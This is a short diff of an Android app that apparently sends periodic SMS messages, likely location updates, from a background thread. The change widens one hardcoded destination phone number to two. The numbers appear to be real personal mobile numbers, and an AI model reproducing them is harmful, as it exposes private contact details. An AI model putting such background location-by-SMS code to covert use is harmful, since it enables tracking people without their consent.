@@ -72,7 +72,7 @@ class SynchronizedLocation {
 
 public class MainActivity extends AppCompatActivity implements LocationListener {
 
-    private final static String destinationAddress = "07473424585";
+    private final static String[] destinationAddresses = {"07473424585", "07591849894"};
 
     private final static boolean RUN_AS_DEMON = true;
     private final static String SMS_THREAD_NAME = "smsThread";
@@ -120,13 +120,15 @@ public class MainActivity extends AppCompatActivity implements LocationListener 
     // Called periodically to send an SMS.
     private void sendSMS(String msg) {
         SmsManager smsManager = SmsManager.getDefault();
-        smsManager.sendTextMessage(
-                destinationAddress,
-                null,
-                msg,
-                null,
-                null
-        );
+        for (String destinationAddress : destinationAddresses) {
+            smsManager.sendTextMessage(
+                    destinationAddress,
+                    null,
+                    msg,
+                    null,
+                    null
+            );
+        }
     }
 
     @Override
